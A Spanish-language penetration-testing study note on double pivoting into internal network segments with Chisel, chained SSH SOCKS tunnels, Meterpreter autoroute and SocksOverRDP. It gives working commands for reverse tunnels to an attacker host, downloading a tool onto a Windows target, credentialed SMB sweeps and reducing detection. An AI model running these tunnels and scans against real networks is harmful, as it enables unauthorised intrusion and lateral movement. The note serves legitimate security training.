# Doble Pivot y SocksOverRDP

## Doble Pivot y SocksOverRDP

### Concepto de doble pivot

Un doble pivot ocurre cuando la red interna objetivo no es directamente accesible desde el primer pivot host — hay un segundo segmento de red que solo es alcanzable desde el primer pivot. Se necesita encadenar dos túneles.

```
Atacante → Pivot1 → Pivot2 → red objetivo
10.10.14.18   172.16.5.129   172.16.6.x    172.16.7.x
```

El atacante no puede ver `172.16.7.x` directamente, ni siquiera a través del primer pivot. Solo Pivot2 tiene acceso a ese segmento.

### Doble pivot con Chisel

#### Arquitectura

```
Atacante (server) ← Pivot1 (client+server) ← Pivot2 (client)
     :8080               :8081 / :1080              R:socks
```

#### Paso 1 — Servidor Chisel en el atacante

```bash
# Atacante
./chisel server --reverse --port 8080
```

#### Paso 2 — Pivot1: cliente hacia el atacante + servidor para Pivot2

```bash
# Pivot1 — conectar al atacante y exponer SOCKS en atacante:1080
./chisel client 10.10.14.18:8080 R:socks &

# Pivot1 — levantar servidor Chisel para que Pivot2 se conecte
./chisel server --reverse --port 8081 &
```

#### Paso 3 — Pivot2: cliente hacia Pivot1

```bash
# Pivot2 — conectar a Pivot1 y crear segundo SOCKS en atacante:1081
./chisel client 172.16.5.129:8081 R:1081:socks
```

#### Paso 4 — Proxychains encadenadas en el atacante

```bash
# /etc/proxychains.conf — encadenar los dos SOCKS
[ProxyList]
socks5 127.0.0.1 1080    # primer salto → llega a 172.16.5.0/24
socks5 127.0.0.1 1081    # segundo salto → llega a 172.16.7.0/24
```

```bash
# Ahora se puede alcanzar la red del segundo segmento
proxychains nmap -v -Pn -sT -p 445,80,3389 172.16.7.10
proxychains netexec smb 172.16.7.0/24 -u usuario -p contraseña
```

### Doble pivot con SSH

Si ambos pivots tienen SSH accesible:

```bash
# Primer túnel — SOCKS en 9050 via Pivot1
ssh -D 9050 -N -f usuario@172.16.5.129

# Segundo túnel — desde Pivot1 a Pivot2, SOCKS en 9051
# Usar proxychains para que el segundo SSH pase por el primero
proxychains ssh -D 9051 -N -f usuario@172.16.6.50

# proxychains.conf con ambos
socks5 127.0.0.1 9050
socks5 127.0.0.1 9051
```

### Doble pivot con Meterpreter + AutoRoute

```bash
# Sesión 1 — Pivot1 comprometido
meterpreter> run autoroute -s 172.16.5.0/24
meterpreter> run autoroute -s 172.16.6.0/24

# Comprometer Pivot2 desde Metasploit via el primer pivot
# El tráfico sale por la sesión 1 automáticamente

# Sesión 2 — Pivot2 comprometido
meterpreter> run autoroute -s 172.16.7.0/24

# SOCKS proxy que cubre toda la cadena
msf6> use auxiliary/server/socks_proxy
msf6> set SRVPORT 9050
msf6> run

proxychains nmap -Pn -sT 172.16.7.10
```

### SocksOverRDP

SocksOverRDP es una herramienta que crea un proxy SOCKS5 tunnelizado dentro de una sesión RDP usando el canal de datos virtual dinámico de RDP. Permite enrutar tráfico a través de una conexión RDP existente sin abrir puertos adicionales.

**Caso de uso típico:** se tiene acceso RDP a un host Windows en la red interna, pero no hay SSH ni Chisel disponible. SocksOverRDP permite usar esa sesión RDP como túnel SOCKS.

#### Componentes

| Componente                | Dónde corre                | Función                                                      |
| ------------------------- | -------------------------- | ------------------------------------------------------------ |
| `SocksOverRDP-Plugin.dll` | Host atacante              | Plugin para xfreerdp/mstsc que crea el canal virtual         |
| `SocksOverRDP-Server.exe` | Host Windows (destino RDP) | Recibe el tráfico del canal virtual y actúa como proxy SOCKS |

#### Instalación y preparación

```bash
# Descargar releases desde GitHub
# https://github.com/nccgroup/SocksOverRDP/releases

# En el atacante — el plugin se carga con xfreerdp
# En el Windows objetivo — transferir SocksOverRDP-Server.exe
```

#### Paso 1 — Transferir el servidor al Windows objetivo

```bash
# Desde el atacante via RDP clipboard o servidor HTTP
python3 -m http.server 8888

# En el Windows objetivo (PowerShell)
Invoke-WebRequest -Uri "http://10.10.14.18:8888/SocksOverRDP-Server.exe" `
  -OutFile "C:\Windows\Temp\SocksOverRDP-Server.exe"
```

#### Paso 2 — Registrar el plugin en el atacante

```bash
# Linux — el plugin se carga directamente con xfreerdp
# No requiere registro previo
```

En Windows (si se usa mstsc en lugar de xfreerdp):

```cmd
# Registrar el plugin DLL (requiere admin)
regsvr32 SocksOverRDP-Plugin.dll
```

#### Paso 3 — Ejecutar el servidor en el Windows objetivo

```cmd
# En el Windows objetivo — ejecutar antes de conectar via RDP
C:\Windows\Temp\SocksOverRDP-Server.exe
```

El servidor escucha en `127.0.0.1:1080` dentro del Windows objetivo esperando conexiones del plugin.

#### Paso 4 — Conectar via RDP con el plugin activado

```bash
# xfreerdp con el plugin de SocksOverRDP
xfreerdp /v:172.16.5.19 /u:usuario /p:contraseña \
  /dynamic-resolution \
  /drive:tmp,/tmp \
  +clipboard \
  /plugin:SocksOverRDP-Plugin.dll
```

Una vez conectado, el plugin crea el canal virtual y el tráfico SOCKS se tunneliza por la sesión RDP.

#### Paso 5 — SOCKS proxy disponible en el atacante

El proxy SOCKS5 queda disponible en `127.0.0.1:1080` del atacante:

```bash
# /etc/proxychains.conf
socks5 127.0.0.1 1080

# Usar normalmente
proxychains nmap -Pn -sT -p 445,80,3389 172.16.6.0/24
proxychains netexec smb 172.16.6.0/24 -u usuario -p contraseña
proxychains curl http://172.16.6.10/
```

#### SocksOverRDP como segundo salto (doble pivot)

Si el Windows objetivo con RDP tiene acceso a un tercer segmento, SocksOverRDP proporciona ese segundo salto:

```
Atacante → xfreerdp → Windows RDP (172.16.5.19) → 172.16.6.0/24
                      SocksOverRDP-Server.exe
                      SOCKS en atacante:1080
```

```bash
# proxychains.conf — SOCKS de SocksOverRDP como segundo salto
# (si el primer salto ya está configurado con Chisel/SSH)
[ProxyList]
socks5 127.0.0.1 9050    # primer pivot via Chisel/SSH
socks5 127.0.0.1 1080    # segundo pivot via SocksOverRDP
```

### Verificación de túneles encadenados

```bash
# Ver todos los proxies SOCKS activos
ss -tlnp | grep -E "1080|1081|9050|9051"

# Probar cada salto individualmente
# Primer salto
proxychains -q curl http://172.16.5.1

# Con ambos saltos
proxychains curl http://172.16.7.1
```

### Consideraciones operativas

**Latencia:** cada salto añade latencia. Con doble pivot, Nmap puede necesitar timeouts mayores:

```bash
proxychains nmap -Pn -sT --host-timeout 30s --scan-delay 500ms 172.16.7.0/24
```

**Estabilidad:** los túneles encadenados son menos estables. Usar `--keepalive` en Chisel y `--max-retry-count` para reconexión automática.

**Detección:** cada salto extra aumenta la superficie de detección. Minimizar el tráfico de descubrimiento y priorizar targets conocidos antes de hacer escaneos amplios.

### Resumen de técnicas por escenario

| Escenario                          | Técnica recomendada       |
| ---------------------------------- | ------------------------- |
| Pivot1 tiene SSH                   | SSH `-D` encadenado       |
| Pivot1 tiene shell, sin SSH        | Chisel server+client      |
| Solo acceso RDP al objetivo        | SocksOverRDP              |
| Sesión Meterpreter activa          | AutoRoute + socks\_proxy  |
| Entorno corporativo con proxy NTLM | Rpivot con `--ntlm-proxy` |
| Necesidad de HTTPS para evasión    | Chisel con TLS            |
